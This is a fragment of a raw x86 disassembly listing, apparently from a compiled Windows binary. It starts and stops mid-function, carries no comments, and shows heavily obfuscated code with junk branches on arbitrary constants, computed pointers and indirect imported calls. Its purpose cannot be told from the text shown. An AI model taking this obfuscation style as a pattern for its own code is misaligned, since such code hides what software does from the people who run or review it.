  4018df:	mov    BYTE PTR [ebp-0x20],dl
  4018e2:	cmp    DWORD PTR [ebp-0x24],0xd1ad7a61
  4018e9:	jle    0x4018f4
  4018eb:	movzx  eax,BYTE PTR [ebp-0x28]
  4018ef:	jmp    0x401ec1
  4018f4:	mov    eax,DWORD PTR [ebp-0xc]
  4018f7:	movzx  edx,BYTE PTR [eax]
  4018fa:	mov    ecx,DWORD PTR [ebp-0x10]
  4018fd:	mov    BYTE PTR [ecx],dl
  4018ff:	movzx  eax,BYTE PTR [ebp-0x28]
  401903:	sub    eax,DWORD PTR [ebp+0x10]
  401906:	mov    BYTE PTR [ebp-0x28],al
  401909:	cmp    BYTE PTR [ebp-0x20],0x86
  40190d:	jle    0x401919
  40190f:	mov    edx,DWORD PTR [ebp-0x24]
  401912:	mov    eax,edx
  401914:	jmp    0x401ec1
  401919:	movzx  edx,BYTE PTR [ebp-0x28]
  40191d:	movzx  eax,BYTE PTR [ebp-0x20]
  401921:	sub    edx,eax
  401923:	add    edx,0x87
  401929:	mov    ecx,DWORD PTR [ebp-0x10]
  40192c:	add    ecx,edx
  40192e:	mov    DWORD PTR [ebp-0x10],ecx
  401931:	mov    ecx,DWORD PTR [ebp-0x24]
  401934:	add    ecx,DWORD PTR [ebp+0x8]
  401937:	mov    BYTE PTR [ebp-0x20],cl
  40193a:	cmp    BYTE PTR [ebp-0x28],0x0
  40193e:	jge    0x401949
  401940:	movzx  eax,BYTE PTR [ebp-0x20]
  401944:	jmp    0x401ec1
  401949:	movzx  ecx,BYTE PTR [ebp-0x28]
  40194d:	add    ecx,DWORD PTR [ebp-0x24]
  401950:	sub    ecx,0xd1ad7a60
  401956:	mov    eax,DWORD PTR [ebp-0xc]
  401959:	add    eax,ecx
  40195b:	mov    DWORD PTR [ebp-0xc],eax
  40195e:	mov    edx,DWORD PTR [ebp+0xc]
  401961:	imul   edx,edx,0xfe60
  401967:	movzx  eax,BYTE PTR [ebp-0x20]
  40196b:	imul   edx,eax
  40196e:	mov    BYTE PTR [ebp-0x2c],dl
  401971:	movzx  ecx,BYTE PTR [ebp-0x2c]
  401975:	movzx  eax,BYTE PTR [ebp-0x28]
  401979:	or     ecx,eax
  40197b:	sub    ecx,0xffffffff
  40197e:	mov    eax,DWORD PTR [ebp-0x14]
  401981:	sub    eax,ecx
  401983:	mov    DWORD PTR [ebp-0x14],eax
  401986:	movzx  edx,BYTE PTR [ebp-0x20]
  40198a:	add    edx,edx
  40198c:	mov    BYTE PTR [ebp-0x2c],dl
  40198f:	jmp    0x401dfd
  401994:	mov    ecx,DWORD PTR [ebp+0x10]
  401997:	mov    WORD PTR [ebp-0x30],cx
  40199b:	mov    edx,DWORD PTR [ebp+0xc]
  40199e:	and    edx,DWORD PTR [ebp+0x8]
  4019a1:	mov    DWORD PTR [ebp-0x34],edx
  4019a4:	movzx  eax,WORD PTR [ebp-0x30]
  4019a8:	mov    WORD PTR [ebp-0x30],ax
  4019ac:	cmp    WORD PTR [ebp-0x30],0xbd00
  4019b2:	jge    0x4019bf
  4019b4:	movzx  ecx,WORD PTR [ebp-0x30]
  4019b8:	mov    eax,ecx
  4019ba:	jmp    0x401ec1
  4019bf:	mov    edx,DWORD PTR [ebp+0x10]
  4019c2:	and    edx,0xb789
  4019c8:	mov    ecx,DWORD PTR [ebp-0x34]
  4019cb:	sub    ecx,edx
  4019cd:	mov    DWORD PTR [ebp-0x38],ecx
  4019d0:	cmp    WORD PTR [ebp-0x30],0xbd00
  4019d6:	jge    0x4019fa
  4019d8:	push   DWORD PTR [ebp-0x38]
  4019db:	mov    ecx,DWORD PTR [ebp-0x38]
  4019de:	or     ecx,0x5e
  4019e1:	or     ecx,DWORD PTR [ebp-0x38]
  4019e4:	push   ecx
  4019e5:	movzx  ecx,WORD PTR [ebp-0x30]
  4019e9:	push   ecx
  4019ea:	mov    edx,DWORD PTR [ebp-0x38]
  4019ed:	add    edx,0x2e000000
  4019f3:	push   edx
  4019f4:	call   DWORD PTR ds:0x4220b0
  4019fa:	cmp    WORD PTR [ebp-0x30],0xbd00
  401a00:	jge    0x401a0c
  401a02:	mov    ecx,DWORD PTR [ebp-0x38]
  401a05:	mov    eax,ecx
  401a07:	jmp    0x401ec1
  401a0c:	mov    eax,DWORD PTR [ebp-0x34]
  401a0f:	imul   eax,DWORD PTR [ebp-0x38]
  401a13:	mov    edx,DWORD PTR [ebp-0xc]
  401a16:	movzx  ecx,BYTE PTR [edx+eax*1]
  401a1a:	shl    ecx,0x18
  401a1d:	mov    DWORD PTR [ebp-0x3c],ecx
  401a20:	movzx  eax,WORD PTR [ebp-0x30]
  401a24:	sub    eax,0xc35400
  401a29:	mov    DWORD PTR [ebp-0x38],eax
  401a2c:	cmp    WORD PTR [ebp-0x30],0xbcff
  401a32:	jne    0x401a68
  401a34:	movzx  ecx,WORD PTR [ebp-0x30]
  401a38:	or     ecx,0x2800
  401a3e:	imul   ecx,DWORD PTR [ebp-0x38]
  401a42:	push   ecx
  401a43:	mov    edx,DWORD PTR [ebp-0x38]
  401a46:	add    edx,DWORD PTR [ebp-0x34]
  401a49:	push   edx
  401a4a:	push   DWORD PTR [ebp-0x38]
  401a4d:	mov    edx,DWORD PTR [ebp-0x38]
  401a50:	and    edx,0x23000000
  401a56:	push   edx
  401a57:	movzx  ecx,WORD PTR [ebp-0x30]
  401a5b:	or     ecx,0xbfc40000
  401a61:	push   ecx
  401a62:	call   DWORD PTR ds:0x422004
  401a68:	mov    eax,DWORD PTR [ebp-0x34]
  401a6b:	xor    eax,DWORD PTR [ebp-0x38]
  401a6e:	add    eax,0xc29700
  401a73:	mov    ecx,DWORD PTR [ebp-0xc]
  401a76:	movzx  edx,BYTE PTR [ecx+eax*1]
  401a7a:	shl    edx,0x10
  401a7d:	mov    DWORD PTR [ebp-0x40],edx
  401a80:	movzx  eax,WORD PTR [ebp-0x30]
  401a84:	or     eax,DWORD PTR [ebp-0x34]
  401a87:	xor    eax,DWORD PTR [ebp-0x38]
  401a8a:	mov    DWORD PTR [ebp-0x38],eax
  401a8d:	cmp    DWORD PTR [ebp-0x34],0x0
  401a91:	jle    0x401a9b
  401a93:	mov    eax,DWORD PTR [ebp-0x34]
  401a96:	jmp    0x401ec1
  401a9b:	mov    ecx,DWORD PTR [ebp-0x3c]
  401a9e:	add    ecx,DWORD PTR [ebp-0x40]
  401aa1:	mov    edx,DWORD PTR [ebp-0x34]
  401aa4:	sub    edx,DWORD PTR [ebp-0x38]
  401aa7:	add    edx,0xff3dd400
  401aad:	add    ecx,edx
  401aaf:	mov    DWORD PTR [ebp-0x3c],ecx
  401ab2:	mov    ecx,DWORD PTR [ebp-0x38]
  401ab5:	add    ecx,ecx
  401ab7:	sub    ecx,0xb6
  401abd:	mov    BYTE PTR [ebp-0x44],cl
  401ac0:	mov    eax,DWORD PTR [ebp-0x34]
  401ac3:	movzx  ecx,BYTE PTR [ebp-0x44]
  401ac7:	xor    eax,ecx
  401ac9:	add    eax,0xffffffb6
  401acc:	mov    edx,DWORD PTR [ebp-0xc]
  401acf:	movzx  ecx,BYTE PTR [edx+eax*1]
  401ad3:	shl    ecx,0x8
  401ad6:	mov    DWORD PTR [ebp-0x40],ecx
  401ad9:	movzx  ecx,WORD PTR [ebp-0x30]
  401add:	add    ecx,0x1
  401ae0:	mov    WORD PTR [ebp-0x30],cx
  401ae4:	cmp    BYTE PTR [ebp-0x44],0x4a
  401ae8:	je     0x401af5
  401aea:	movzx  edx,BYTE PTR [ebp-0x44]
  401aee:	mov    eax,edx
  401af0:	jmp    0x401ec1
  401af5:	mov    edx,DWORD PTR [ebp-0x3c]
  401af8:	add    edx,DWORD PTR [ebp-0x40]
  401afb:	mov    DWORD PTR [ebp-0x3c],edx
  401afe:	movzx  edx,BYTE PTR [ebp-0x44]
  401b02:	shr    edx,1
  401b04:	mov    DWORD PTR [ebp-0x38],edx
  401b07:	mov    edx,DWORD PTR [ebp-0x34]
  401b0a:	movzx  eax,WORD PTR [ebp-0x30]
  401b0e:	add    edx,eax
  401b10:	add    edx,0xffff42ff
  401b16:	mov    ecx,DWORD PTR [ebp-0xc]
  401b19:	movzx  eax,BYTE PTR [ecx+edx*1]
  401b1d:	mov    ecx,DWORD PTR [ebp-0x3c]
  401b20:	add    ecx,eax
  401b22:	mov    DWORD PTR [ebp-0x3c],ecx
  401b25:	movzx  edx,BYTE PTR [ebp-0x44]
  401b29:	imul   edx,edx,0x443c00
  401b2f:	mov    ecx,DWORD PTR [ebp+0xc]
  401b32:	add    ecx,edx
  401b34:	mov    DWORD PTR [ebp-0x34],ecx
  401b37:	mov    edx,DWORD PTR [ebp-0x34]
  401b3a:	movzx  eax,WORD PTR [ebp-0x30]
  401b3e:	sub    edx,eax
  401b40:	sub    edx,0x13759aff
  401b46:	mov    eax,DWORD PTR [ebp-0xc]
  401b49:	sub    eax,edx
  401b4b:	mov    DWORD PTR [ebp-0x4],eax
  401b4e:	mov    edx,DWORD PTR [ebp+0x10]
  401b51:	mov    DWORD PTR [ebp-0x38],edx
  401b54:	cmp    DWORD PTR [ebp-0x38],0xbd00
  401b5b:	jge    0x401b67
  401b5d:	mov    ecx,DWORD PTR [ebp-0x34]
  401b60:	mov    eax,ecx
  401b62:	jmp    0x401ec1
  401b67:	mov    eax,DWORD PTR [ebp-0x38]
  401b6a:	movzx  edx,WORD PTR [ebp-0x30]
  401b6e:	add    eax,edx
  401b70:	sub    eax,0x17a01
  401b75:	mov    DWORD PTR [ebp-0x40],eax
  401b78:	mov    ecx,DWORD PTR [ebp-0x34]
  401b7b:	shr    ecx,0x3
  401b7e:	mov    BYTE PTR [ebp-0x48],cl
  401b81:	mov    ecx,DWORD PTR [ebp-0x34]
  401b84:	movzx  edx,BYTE PTR [ebp-0x44]
  401b88:	sub    ecx,edx
  401b8a:	add    ecx,0xec89a84a
  401b90:	mov    eax,DWORD PTR [ebp-0x4]
  401b93:	mov    edx,DWORD PTR [eax+ecx*4]
  401b96:	cmp    edx,DWORD PTR [ebp-0x3c]
  401b99:	jne    0x401c96
  401b9f:	mov    ecx,DWORD PTR [ebp+0x10]
  401ba2:	mov    DWORD PTR [ebp-0x4c],ecx
  401ba5:	mov    eax,DWORD PTR [ebp+0x10]
  401ba8:	xor    eax,0x665beaeb
  401bad:	mov    edx,DWORD PTR [ebp+0xc]
  401bb0:	imul   edx,eax
  401bb3:	mov    DWORD PTR [ebp-0x4c],edx
  401bb6:	cmp    DWORD PTR [ebp-0x4c],0xfd7f0000
  401bbd:	jge    0x401bc9
  401bbf:	mov    edx,DWORD PTR [ebp-0x4c]
  401bc2:	mov    eax,edx
  401bc4:	jmp    0x401ec1
  401bc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401bcc:	mov    WORD PTR [ebp-0x50],cx
  401bd0:	cmp    DWORD PTR [ebp-0x4c],0xfd7f0000
  401bd7:	jge    0x401be2
  401bd9:	movzx  eax,WORD PTR [ebp-0x50]
  401bdd:	jmp    0x401ec1
  401be2:	mov    edx,DWORD PTR [ebp-0x4c]
  401be5:	add    edx,0x1
  401be8:	mov    DWORD PTR [ebp-0x4c],edx
  401beb:	movzx  eax,WORD PTR [ebp-0x50]
  401bef:	or     eax,DWORD PTR [ebp-0x4c]
  401bf2:	sub    eax,0xfd7fffbc
  401bf7:	mov    edx,DWORD PTR [ebp-0x4]
  401bfa:	mov    ecx,DWORD PTR [edx+eax*4]
  401bfd:	cmp    ecx,DWORD PTR [ebp-0x3c]
  401c00:	jne    0x401c76
  401c02:	mov    edx,DWORD PTR [ebp+0xc]
  401c05:	mov    DWORD PTR [ebp-0x54],edx
  401c08:	mov    eax,DWORD PTR [ebp-0x54]
  401c0b:	shl    eax,0x10
  401c0e:	mov    WORD PTR [ebp-0x58],ax
  401c12:	cmp    DWORD PTR [ebp-0x54],0xffbcffff
  401c19:	jne    0x401c25
  401c1b:	mov    ecx,DWORD PTR [ebp-0x54]
  401c1e:	mov    eax,ecx
  401c20:	jmp    0x401ec1
  401c25:	movzx  edx,WORD PTR [ebp-0x58]
  401c29:	shl    edx,0x8
  401c2c:	mov    BYTE PTR [ebp-0x5c],dl
  401c2f:	mov    eax,DWORD PTR [ebp+0x10]
  401c32:	imul   eax,eax,0x5890
  401c38:	mov    WORD PTR [ebp-0x58],ax
  401c3c:	movzx  eax,BYTE PTR [ebp-0x5c]
  401c40:	xor    edx,edx
  401c42:	div    DWORD PTR [ebp-0x54]
  401c45:	mov    BYTE PTR [ebp-0x5c],al
  401c48:	cmp    DWORD PTR [ebp-0x54],0xffbcffff
  401c4f:	jne    0x401c5c
  401c51:	movzx  ecx,BYTE PTR [ebp-0x5c]
  401c55:	mov    eax,ecx
  401c57:	jmp    0x401ec1
  401c5c:	movzx  ecx,BYTE PTR [ebp-0x5c]
  401c60:	sub    ecx,DWORD PTR [ebp-0x54]
  401c63:	add    ecx,0xffbd0001
  401c69:	mov    DWORD PTR [ebp-0x40],ecx
  401c6c:	mov    ecx,DWORD PTR [ebp-0x54]
  401c6f:	shl    ecx,0x10
  401c72:	mov    WORD PTR [ebp-0x60],cx
  401c76:	movzx  eax,WORD PTR [ebp-0x50]
  401c7a:	and    eax,DWORD PTR [ebp-0x4c]
  401c7d:	and    eax,0x538900
  401c82:	mov    DWORD PTR [ebp-0x4c],eax
  401c85:	cmp    DWORD PTR [ebp-0x4c],0x0
  401c89:	jle    0x401c96
  401c8b:	movzx  ecx,WORD PTR [ebp-0x50]
  401c8f:	mov    eax,ecx
  401c91:	jmp    0x401ec1
  401c96:	movzx  eax,BYTE PTR [ebp-0x48]
  401c9a:	xor    edx,edx
  401c9c:	div    DWORD PTR [ebp-0x38]
  401c9f:	mov    DWORD PTR [ebp-0x34],edx
  401ca2:	cmp    WORD PTR [ebp-0x30],0xbd01
  401ca8:	jle    0x401cb5
  401caa:	movzx  ecx,WORD PTR [ebp-0x30]
  401cae:	mov    eax,ecx
  401cb0:	jmp    0x401ec1
  401cb5:	mov    ecx,DWORD PTR [ebp-0x40]
  401cb8:	test   ecx,ecx
  401cba:	je     0x401d2c
  401cbc:	mov    edx,DWORD PTR [ebp+0x8]
  401cbf:	mov    DWORD PTR [ebp-0x64],edx
  401cc2:	mov    edx,DWORD PTR [ebp-0x64]
  401cc5:	or     edx,DWORD PTR [ebp+0x10]
  401cc8:	mov    DWORD PTR [ebp-0x68],edx
  401ccb:	mov    eax,DWORD PTR [ebp-0x68]
  401cce:	mov    DWORD PTR [ebp-0x64],eax
  401cd1:	mov    ecx,DWORD PTR [ebp-0x68]
  401cd4:	or     ecx,DWORD PTR [ebp+0x8]
  401cd7:	mov    edx,DWORD PTR [ebp-0x64]
  401cda:	add    edx,ecx
  401cdc:	mov    DWORD PTR [ebp-0x68],edx
  401cdf:	mov    eax,DWORD PTR [ebp-0x64]
  401ce2:	sub    eax,DWORD PTR [ebp-0x68]
  401ce5:	add    eax,0xffc5
  401cea:	mov    edx,DWORD PTR [ebp-0x14]
  401ced:	sub    edx,eax
  401cef:	mov    DWORD PTR [ebp-0x14],edx
  401cf2:	mov    eax,DWORD PTR [ebp-0x64]
  401cf5:	add    eax,0x1
  401cf8:	mov    DWORD PTR [ebp-0x64],eax
  401cfb:	cmp    DWORD PTR [ebp-0x68],0x1ff7a
  401d02:	jle    0x401d0e
  401d04:	mov    edx,DWORD PTR [ebp-0x64]
  401d07:	mov    eax,edx
  401d09:	jmp    0x401ec1
  401d0e:	mov    eax,DWORD PTR [ebp-0x68]
  401d11:	sub    eax,DWORD PTR [ebp-0x64]
  401d14:	add    eax,0xffff004c
  401d19:	mov    edx,DWORD PTR [ebp-0xc]
  401d1c:	add    edx,eax
  401d1e:	mov    DWORD PTR [ebp-0xc],edx
  401d21:	mov    edx,DWORD PTR [ebp-0x64]
  401d24:	mov    DWORD PTR [ebp-0x64],edx
  401d27:	jmp    0x401dfd
  401d2c:	mov    eax,DWORD PTR [ebp+0x8]
  401d2f:	mov    DWORD PTR [ebp-0x6c],eax
  401d32:	mov    edx,DWORD PTR [ebp+0xc]
  401d35:	or     edx,0xf1
  401d3b:	mov    DWORD PTR [ebp-0x6c],edx
  401d3e:	mov    edx,DWORD PTR [ebp+0x8]
  401d41:	xor    edx,0x276b
  401d47:	mov    eax,DWORD PTR [ebp-0x6c]
  401d4a:	add    eax,edx
  401d4c:	mov    BYTE PTR [ebp-0x70],al
  401d4f:	cmp    DWORD PTR [ebp-0x6c],0xffbd00f0
  401d56:	jne    0x401d62
  401d58:	mov    edx,DWORD PTR [ebp-0x6c]
  401d5b:	mov    eax,edx
  401d5d:	jmp    0x401ec1
  401d62:	movzx  ecx,BYTE PTR [ebp-0x70]
  401d66:	shl    ecx,0x18
  401d69:	mov    WORD PTR [ebp-0x74],cx
  401d6d:	cmp    DWORD PTR [ebp-0x6c],0xffbd00f1
  401d74:	jge    0x401d7f
  401d76:	movzx  eax,BYTE PTR [ebp-0x70]
  401d7a:	jmp    0x401ec1
  401d7f:	mov    ecx,DWORD PTR [ebp-0x6c]
  401d82:	movzx  eax,BYTE PTR [ebp-0x70]
  401d86:	or     ecx,eax
  401d88:	sub    ecx,0xffbd00f7
  401d8e:	mov    edx,DWORD PTR [ebp-0xc]
  401d91:	movzx  eax,BYTE PTR [edx+ecx*1]
  401d95:	mov    edx,DWORD PTR [ebp-0x10]
  401d98:	mov    BYTE PTR [edx],al
  401d9a:	movzx  eax,BYTE PTR [ebp-0x70]
  401d9e:	mov    BYTE PTR [ebp-0x78],al
  401da1:	cmp    BYTE PTR [ebp-0x78],0xc7
  401da5:	je     0x401daf
  401da7:	mov    eax,DWORD PTR [ebp-0x6c]
  401daa:	jmp    0x401ec1
  401daf:	mov    ecx,DWORD PTR [ebp-0x10]
  401db2:	add    ecx,0x1
  401db5:	mov    DWORD PTR [ebp-0x10],ecx
  401db8:	mov    ecx,DWORD PTR [ebp-0x6c]
  401dbb:	shr    ecx,0x3
  401dbe:	mov    DWORD PTR [ebp-0x6c],ecx
  401dc1:	movzx  ecx,BYTE PTR [ebp-0x78]
  401dc5:	sub    ecx,DWORD PTR [ebp-0x6c]
  401dc8:	add    ecx,0x1ff79f58
  401dce:	mov    edx,DWORD PTR [ebp-0xc]
  401dd1:	add    edx,ecx
  401dd3:	mov    DWORD PTR [ebp-0xc],edx
  401dd6:	mov    ecx,DWORD PTR [ebp-0x6c]
  401dd9:	shr    ecx,0x3
  401ddc:	mov    DWORD PTR [ebp-0x6c],ecx
  401ddf:	movzx  eax,BYTE PTR [ebp-0x70]
  401de3:	movzx  edx,BYTE PTR [ebp-0x78]
  401de7:	sub    eax,edx
  401de9:	add    eax,0x1
  401dec:	mov    ecx,DWORD PTR [ebp-0x14]
  401def:	sub    ecx,eax
  401df1:	mov    DWORD PTR [ebp-0x14],ecx
  401df4:	movzx  eax,WORD PTR [ebp-0x74]
  401df8:	shr    eax,1
  401dfa:	mov    BYTE PTR [ebp-0x7c],al
  401dfd:	mov    ecx,DWORD PTR [ebp-0x1c]
  401e00:	and    ecx,0x1
  401e03:	mov    WORD PTR [ebp-0x18],cx
  401e07:	jmp    0x401839
  401e0c:	mov    esi,DWORD PTR [ebp+0xc]
  401e0f:	cmp    WORD PTR [ebp-0x8],0x88ff
  401e15:	jne    0x401e20
  401e17:	mov    ecx,edi
  401e19:	mov    eax,ecx
  401e1b:	jmp    0x401ec1
  401e20:	mov    edx,ebx
  401e22:	and    edx,esi
  401e24:	sub    edx,0x176df599
  401e2a:	mov    eax,0xe80c9a6b
  401e2f:	xor    eax,edx
  401e31:	mov    DWORD PTR [ebp-0x4],eax
  401e34:	mov    edx,edi
  401e36:	shr    edx,1
  401e38:	mov    WORD PTR [ebp-0x80],dx
  401e3c:	cmp    ebx,0xffbd0000
  401e42:	jle    0x401e48
  401e44:	mov    eax,ebx
  401e46:	jmp    0x401ec1
  401e48:	mov    ecx,esi
  401e4a:	xor    ecx,ebx
  401e4c:	mov    edx,DWORD PTR [ebp-0x4]
  401e4f:	mov    eax,DWORD PTR [edx+ecx*4]
  401e52:	mov    DWORD PTR [ebp-0xc],eax
  401e55:	mov    eax,ebx
  401e57:	xor    eax,0x8044
  401e5c:	mov    WORD PTR [ebp-0x84],ax
  401e63:	cmp    esi,0xffbd0000
  401e69:	jge    0x401e85
  401e6b:	movzx  ecx,WORD PTR [ebp-0x8]
  401e6f:	and    ecx,0x3da9
  401e75:	movzx  edx,WORD PTR [ebp-0x84]
  401e7c:	sub    ecx,edx
  401e7e:	push   ecx
  401e7f:	call   DWORD PTR ds:0x422014
  401e85:	mov    ecx,DWORD PTR [ebp-0x10]
  401e88:	sub    ecx,DWORD PTR [ebp-0xc]
  401e8b:	shr    ecx,0x3
  401e8e:	mov    DWORD PTR [ebp-0x14],ecx
  401e91:	movzx  ecx,WORD PTR [ebp-0x8]
  401e95:	imul   ecx,edi
  401e98:	add    ecx,0x3990630e
  401e9e:	mov    edx,0x39b6181a
  401ea3:	xor    edx,ecx
  401ea5:	mov    DWORD PTR [ebp-0x4],edx
  401ea8:	mov    esi,esi
  401eaa:	mov    ecx,DWORD PTR [ebp-0x4]
  401ead:	mov    edx,DWORD PTR [ebp-0x14]
  401eb0:	mov    DWORD PTR [ecx],edx
  401eb2:	mov    ecx,DWORD PTR [ebp+0x10]
  401eb5:	and    ecx,DWORD PTR [ebp+0xc]
  401eb8:	and    ecx,DWORD PTR [ebp+0x10]
  401ebb:	mov    WORD PTR [ebp-0x80],cx
  401ebf:	mov    eax,ebx
  401ec1:	pop    ebx
  401ec2:	pop    edi
  401ec3:	pop    esi
  401ec4:	mov    esp,ebp
  401ec6:	pop    ebp
  401ec7:	ret    0xc
  401eca:	push   ebp
  401ecb:	mov    ebp,esp
  401ecd:	sub    esp,0x10
  401ed0:	push   esi
  401ed1:	push   edi
  401ed2:	push   ebx
  401ed3:	mov    esi,0xd27ce589
  401ed8:	mov    ecx,DWORD PTR [ebp+0x10]
  401edb:	or     ecx,DWORD PTR [ebp+0x8]
  401ede:	movzx  edi,cl
  401ee1:	cmp    edi,0x16
  401ee4:	je     0x401eed
  401ee6:	mov    eax,esi
  401ee8:	jmp    0x401fa8
  401eed:	mov    eax,DWORD PTR [ebp+0xc]
  401ef0:	or     eax,0xf8b7
  401ef5:	mov    ecx,DWORD PTR [ebp+0xc]
  401ef8:	add    ecx,eax
  401efa:	movzx  ebx,cl
  401efd:	mov    eax,edi
  401eff:	sub    eax,0x1
  401f02:	movzx  edi,al
  401f05:	mov    ecx,DWORD PTR [ebp+0xc]
  401f08:	mov    DWORD PTR [ebp-0x4],ecx
  401f0b:	cmp    DWORD PTR [ebp-0x4],0x0
  401f0f:	jle    0x401f1b
  401f11:	mov    ecx,DWORD PTR [ebp-0x4]
  401f14:	mov    eax,ecx
  401f16:	jmp    0x401fa8
  401f1b:	mov    edx,esi
  401f1d:	sub    edx,0x1
  401f20:	mov    esi,edx
  401f22:	mov    edx,edi
  401f24:	shl    edx,0x8
  401f27:	movzx  ebx,dl
  401f2a:	mov    ecx,DWORD PTR [ebp+0x8]
  401f2d:	sub    ecx,edi
  401f2f:	mov    esi,ecx
  401f31:	mov    ecx,esi
  401f33:	shr    ecx,0x2
  401f36:	mov    DWORD PTR [ebp-0x8],ecx
  401f39:	mov    eax,ebx
  401f3b:	test   al,al
  401f3d:	jne    0x401f4b
  401f3f:	push   edi
  401f40:	push   DWORD PTR [ebp-0x8]
  401f43:	call   0x401000
  401f48:	mov    DWORD PTR [ebp-0x4],eax
  401f4b:	mov    ecx,DWORD PTR [ebp+0x8]
  401f4e:	mov    BYTE PTR [ebp-0xc],cl
  401f51:	mov    ecx,DWORD PTR [ebp-0x8]
  401f54:	imul   ecx,DWORD PTR [ebp+0x8]
  401f58:	mov    DWORD PTR [ebp-0x8],ecx
  401f5b:	mov    eax,edi
  401f5d:	xor    edx,edx
  401f5f:	div    esi
  401f61:	movzx  edi,dl
  401f64:	mov    ecx,DWORD PTR [ebp-0x4]
  401f67:	test   ecx,ecx
  401f69:	jne    0x401f73
  401f6b:	call   0x402212
  401f70:	mov    DWORD PTR [ebp-0x4],eax
  401f73:	mov    edx,DWORD PTR [ebp-0x8]
  401f76:	shl    edx,0x18
  401f79:	mov    DWORD PTR [ebp-0x10],edx
  401f7c:	mov    eax,DWORD PTR [ebp-0x10]
  401f7f:	add    eax,0x1
  401f82:	mov    DWORD PTR [ebp-0x10],eax
  401f85:	movzx  edx,BYTE PTR [ebp-0xc]
  401f89:	add    edx,0x1
  401f8c:	mov    BYTE PTR [ebp-0xc],dl
  401f8f:	mov    eax,DWORD PTR [ebp-0x10]
  401f92:	xor    edx,edx
  401f94:	div    esi
  401f96:	mov    DWORD PTR [ebp-0x10],eax
  401f99:	mov    eax,DWORD PTR [ebp+0x8]
  401f9c:	or     eax,DWORD PTR [ebp-0x8]
  401f9f:	add    eax,edi
  401fa1:	mov    DWORD PTR [ebp-0x4],eax
  401fa4:	mov    ecx,ebx
  401fa6:	mov    eax,ecx
  401fa8:	pop    ebx
  401fa9:	pop    edi
  401faa:	pop    esi
  401fab:	mov    esp,ebp
  401fad:	pop    ebp
  401fae:	ret    0xc
  401fb1:	push   ebp
  401fb2:	mov    ebp,esp
  401fb4:	sub    esp,0x24
  401fb7:	push   esi
  401fb8:	push   edi
  401fb9:	push   ebx
  401fba:	mov    esi,0x5
  401fbf:	mov    edx,esi
  401fc1:	movzx  esi,dl
  401fc4:	cmp    esi,0x5
  401fc7:	jge    0x401fd2
  401fc9:	mov    edx,esi
  401fcb:	mov    eax,edx
  401fcd:	jmp    0x40220b
  401fd2:	mov    eax,esi
  401fd4:	movzx  esi,al
  401fd7:	cmp    esi,0x5
  401fda:	jge    0x402005
  401fdc:	mov    ecx,esi
  401fde:	or     ecx,0x4d03
  401fe4:	mov    eax,esi
  401fe6:	imul   eax,ecx
  401fe9:	push   eax
  401fea:	mov    edx,esi
  401fec:	and    edx,0x2c000000
  401ff2:	push   edx
  401ff3:	mov    edx,esi
  401ff5:	imul   edx,edx
  401ff8:	sub    edx,0x601297f4
  401ffe:	push   edx
  401fff:	call   DWORD PTR ds:0x422084
  402005:	mov    edx,esi
  402007:	imul   edx,edx
  40200a:	sub    edx,esi
  40200c:	movzx  esi,dl
  40200f:	cmp    esi,0x14
  402012:	je     0x40201b
  402014:	mov    eax,esi
  402016:	jmp    0x40220b
  40201b:	mov    edx,esi
  40201d:	movzx  edi,dx
  402020:	cmp    esi,0x14
  402023:	jle    0x40202c
  402025:	mov    eax,edi
  402027:	jmp    0x40220b
  40202c:	mov    ecx,edi
  40202e:	imul   ecx,esi
  402031:	sub    ecx,0x708846c5
  402037:	mov    eax,0x8f359a1b
  40203c:	xor    eax,ecx
  40203e:	mov    ebx,eax
  402040:	mov    ecx,edi
  402042:	xor    ecx,ecx
  402044:	mov    WORD PTR [ebp-0x4],cx
  402048:	cmp    esi,0x14
  40204b:	jle    0x402058
  40204d:	movzx  ecx,WORD PTR [ebp-0x4]
  402051:	mov    eax,ecx
  402053:	jmp    0x40220b
  402058:	mov    edx,esi
  40205a:	add    edx,edi
  40205c:	sub    edx,0xa1ca2736
  402062:	mov    eax,0x5e7648e2
  402067:	xor    eax,edx
  402069:	mov    DWORD PTR [ebp-0x8],eax
  40206c:	movzx  ecx,WORD PTR [ebp-0x4]
  402070:	and    ecx,0xd3a00
  402076:	movzx  esi,cl
  402079:	mov    ecx,esi
  40207b:	xor    ecx,edi
  40207d:	add    ecx,0xffffffec
  402080:	mov    eax,DWORD PTR [ebp-0x8]
  402083:	mov    eax,DWORD PTR [eax+ecx*4]
  402086:	mov    DWORD PTR [ebp-0xc],eax
  402089:	mov    eax,edi
  40208b:	sub    eax,0x1
  40208e:	movzx  edi,ax
  402091:	cmp    WORD PTR [ebp-0x4],0xffff
  402096:	jne    0x4020a1
  402098:	movzx  eax,WORD PTR [ebp-0x4]
  40209c:	jmp    0x40220b
  4020a1:	mov    edx,edi
  4020a3:	sub    edx,esi
  4020a5:	add    edx,0xffffffee
  4020a8:	mov    DWORD PTR [ebp-0x10],edx
  4020ab:	movzx  eax,WORD PTR [ebp-0x4]
  4020af:	imul   eax,eax,0xed41
  4020b5:	movzx  edx,WORD PTR [ebp-0x4]
  4020b9:	add    edx,eax
  4020bb:	movzx  esi,dl
  4020be:	mov    eax,edi
  4020c0:	or     eax,esi
  4020c2:	sub    eax,0x13
  4020c5:	cmp    DWORD PTR [ebp-0x10],eax
  4020c8:	je     0x4021c1
  4020ce:	mov    BYTE PTR [ebp-0x14],0x0
  4020d2:	movzx  edx,BYTE PTR [ebp-0x14]
  4020d6:	shl    edx,0x8
  4020d9:	mov    BYTE PTR [ebp-0x18],dl
  4020dc:	movzx  edx,BYTE PTR [ebp-0x14]
  4020e0:	movzx  ecx,BYTE PTR [ebp-0x18]
  4020e4:	xor    edx,ecx
  4020e6:	mov    BYTE PTR [ebp-0x1c],dl
  4020e9:	cmp    BYTE PTR [ebp-0x14],0x0
  4020ed:	jle    0x4020fa
  4020ef:	movzx  edx,BYTE PTR [ebp-0x18]
  4020f3:	mov    eax,edx
  4020f5:	jmp    0x40220b
  4020fa:	movzx  ecx,BYTE PTR [ebx]
  4020fd:	mov    eax,DWORD PTR [ebp-0xc]
  402100:	mov    BYTE PTR [eax],cl
  402102:	movzx  ecx,BYTE PTR [ebp-0x14]
  402106:	mov    WORD PTR [ebp-0x20],cx
  40210a:	cmp    WORD PTR [ebp-0x20],0x0
  40210f:	jge    0x40211c
  402111:	movzx  edx,BYTE PTR [ebp-0x1c]
  402115:	mov    eax,edx
  402117:	jmp    0x40220b
  40211c:	movzx  eax,WORD PTR [ebp-0x20]
  402120:	movzx  edx,BYTE PTR [ebp-0x14]
  402124:	xor    eax,edx
